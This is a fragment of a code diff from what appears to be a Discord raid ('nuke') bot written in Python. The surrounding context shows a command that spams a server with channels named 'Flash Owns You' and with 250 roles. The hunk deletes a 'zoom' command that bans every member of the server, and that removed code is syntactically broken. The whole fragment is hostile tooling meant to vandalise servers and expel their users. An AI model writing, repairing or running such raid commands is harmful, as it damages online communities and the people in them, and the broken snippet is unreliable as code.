@@ -413,13 +413,6 @@ async def Fog(ctx):
         await ctx.guild.create_text_channel(name="Flash Owns You")
     for _i in range(250):
         await ctx.guild.create_role(name="MistW", color=(0x000000))
-@Ioxide.command()
-async def zoom(ctx):
-	await ctx.message.delete()
-	for member in ctx.guild.members:
-		 try:
-		     await member.ban()
-		pass
 
 if __name__ == '__main__':
     Init()
